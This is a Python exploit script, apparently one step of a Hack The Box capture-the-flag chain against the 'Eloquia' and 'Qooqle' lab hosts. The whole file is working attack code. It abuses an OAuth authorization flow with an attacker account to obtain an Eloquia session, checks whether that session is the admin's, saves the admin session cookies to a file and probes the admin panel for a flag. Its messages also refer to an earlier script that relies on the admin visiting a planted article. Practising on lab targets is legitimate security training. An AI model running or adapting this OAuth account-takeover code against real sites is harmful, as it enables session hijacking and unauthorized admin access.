#!/usr/bin/env python3
"""
05_login_as_admin.py - Login to Eloquia as admin via OAuth
"""

import requests
import os
import sys
import re

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")

TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"

CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

def load_credentials():
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def main():
    username, password = load_credentials()
    if not username:
        print("[-] No credentials. Run ./01_register_users.sh")
        sys.exit(1)

    print("╔══════════════════════════════════════════════════════════╗")
    print("║         05 - LOGIN AS ADMIN VIA OAUTH                    ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print()

    # Login to Qooqle with our attacker account
    print("[1/3] Logging into Qooqle as attacker...")
    qooqle_session = requests.Session()

    login_page = qooqle_session.get(f"{TARGET_QOOQLE}/login/")
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', login_page.text).group(1)

    resp = qooqle_session.post(f"{TARGET_QOOQLE}/login/", data={
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'password': password
    }, headers={'Referer': f"{TARGET_QOOQLE}/login/"})

    if 'sessionid' not in qooqle_session.cookies:
        print("[-] Qooqle login failed!")
        sys.exit(1)
    print(f"    Logged in as {username}")

    # Start OAuth flow from Eloquia
    print("[2/3] Initiating OAuth flow from Eloquia...")
    eloquia_session = requests.Session()

    # Visit the OAuth initiate endpoint
    oauth_init = eloquia_session.get(f"{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/", allow_redirects=False)

    # This should redirect to Qooqle authorize
    qooqle_auth_url = oauth_init.headers.get('Location', '')
    print(f"    Redirected to: {qooqle_auth_url[:60]}...")

    if 'qooqle' not in qooqle_auth_url:
        print("[-] Unexpected redirect")
        sys.exit(1)

    # Use our Qooqle session to authorize
    auth_page = qooqle_session.get(qooqle_auth_url)
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', auth_page.text)

    if not csrf:
        print("[-] Could not get CSRF from auth page")
        sys.exit(1)
    csrf = csrf.group(1)

    # Authorize
    resp = qooqle_session.post(qooqle_auth_url, data={
        'csrfmiddlewaretoken': csrf,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write',
        'client_id': CLIENT_ID,
        'response_type': 'code',
        'allow': 'Authorize'
    }, headers={'Referer': qooqle_auth_url}, allow_redirects=False)

    callback_url = resp.headers.get('Location', '')
    print(f"    Callback: {callback_url[:60]}...")

    # Follow the callback with Eloquia session
    print("[3/3] Following OAuth callback...")
    resp = eloquia_session.get(callback_url, allow_redirects=True)

    # Check if we got a session
    if 'sessionid' in eloquia_session.cookies:
        print()
        print("[+] SUCCESS! Got Eloquia session!")

        # Check who we are
        profile = eloquia_session.get(f"{TARGET_ELOQUIA}/accounts/profile/")

        # Extract username
        username_match = re.search(r'value="([^"]+)"[^>]*id="id_username"', profile.text)
        if not username_match:
            username_match = re.search(r'Howdy,\s*(\w+)', profile.text)

        if username_match:
            logged_in_as = username_match.group(1)
            print(f"    Logged in as: {logged_in_as}")

            if 'admin' in logged_in_as.lower():
                print()
                print("*" * 60)
                print("  [!!!] ADMIN ACCESS CONFIRMED!")
                print("*" * 60)

                # Save admin session cookies
                with open(os.path.join(TMP_DIR, "admin_cookies.txt"), "w") as f:
                    for cookie in eloquia_session.cookies:
                        f.write(f"{cookie.name}={cookie.value}\n")
                print(f"    Admin cookies saved to: {TMP_DIR}/admin_cookies.txt")

                # Look for flag or interesting content
                print()
                print("    Exploring admin access...")

                # Check profile for flag
                if 'HTB{' in profile.text or 'flag' in profile.text.lower():
                    print("    [!] Flag might be in profile!")

                # Check if there's an admin panel
                admin_check = eloquia_session.get(f"{TARGET_ELOQUIA}/admin/")
                if admin_check.status_code == 200:
                    print("    [!] Admin panel accessible at /admin/")
        else:
            print("    Could not determine username")
            print("    Check manually in browser")
    else:
        print()
        print("[-] No session obtained")
        print("    The admin may not have visited the article yet.")
        print("    Wait a bit and try again, or re-run 04_oauth_exploit.py")

if __name__ == "__main__":
    main()
